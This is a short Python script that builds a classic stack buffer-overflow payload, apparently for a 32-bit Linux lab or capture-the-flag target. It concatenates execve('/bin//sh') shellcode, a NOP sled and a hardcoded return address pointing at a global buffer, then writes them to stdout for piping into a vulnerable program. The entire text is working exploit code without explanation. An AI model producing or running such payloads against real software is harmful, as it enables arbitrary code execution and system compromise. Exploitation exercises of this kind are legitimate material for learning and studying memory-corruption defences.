
import sys
import struct

shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" # 21 bytes

no_operation_code = b"\x90" * 27

# convert the integer value of the address into a binary representation
# using "I" for a 4-byte unsigned integer (32 bits)
# 0x80dacc0 address of global variable Name
return_addr = struct.pack("I",0x80dacc0)

sys.stdout.buffer.write((shellcode + no_operation_code + return_addr))


